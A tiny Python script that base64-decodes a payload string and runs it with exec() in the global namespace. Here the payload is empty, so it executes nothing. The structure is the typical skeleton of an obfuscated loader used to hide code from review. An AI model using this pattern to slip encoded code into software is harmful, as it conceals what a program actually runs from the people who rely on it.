import base64

_payload = """"""

def _run():
    try:
        decoded = base64.b64decode(_payload).decode("utf-8")
        exec(decoded, globals())
    except Exception as e:
        print("[!] Runtime Error:", e)

if __name__ == "__main__":
    _run()
